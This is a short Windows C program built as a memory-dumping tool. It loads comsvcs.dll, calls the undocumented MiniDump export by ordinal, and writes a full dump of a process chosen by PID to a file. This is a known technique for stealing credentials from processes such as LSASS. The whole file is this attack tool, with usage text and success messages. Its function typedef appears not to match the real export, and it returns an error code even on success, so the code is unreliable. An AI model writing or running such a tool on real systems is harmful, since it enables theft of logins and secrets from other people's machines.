#include <Windows.h>
#include <stdio.h>
#include <tchar.h>




typedef BOOL(WINAPI* pMiniDump)(DWORD, HANDLE, DWORD);


int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: %s <PID> <DumpFile>\n", argv[0]);
		return 1;
	}

	DWORD pid = atoi(argv[1]);
	char* dumpFile = argv[2];

	HMODULE hMod = LoadLibraryEx(L"C:\\Windows\\System32\\comsvcs.dll",NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
	if (!hMod) {
		printf("[-] couldn't load comsvcs.dll. Error: %d\n", GetLastError());
		return 1;

	}

	// dumpbin /exports C:\windows\system32\comsvcs.dll to find the ordinal of MiniDumpW which is 24
	pMiniDump MiniDump = (pMiniDump)GetProcAddress(hMod, (LPCSTR)24);
	if (!MiniDump) {
		printf("[-] failed to get MiniDump function. Error: %d\n", GetLastError());
		return 1;
	}

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProcess) {
		printf("[-] failed to open process %d. Error: %d\n", pid, GetLastError());
		//CloseHandle(hProcess);
		return 1;
	}



	HANDLE hFile = CreateFile(dumpFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] failed to create a dump file. Error:%d\n", GetLastError());
		CloseHandle(hProcess);
		return 1;
	}


	BOOL success = MiniDump(pid, hFile, 2); // 2 corresponds to full dump
	if (!success) {
		printf("[-] MiniDump failed. Error: %d\n", GetLastError());
	}
	else {
		printf("[+] Dump successful: %s\n", dumpFile);
	}


	CloseHandle(hFile);
	CloseHandle(hProcess);
	FreeLibrary(hMod);

	return 1;


}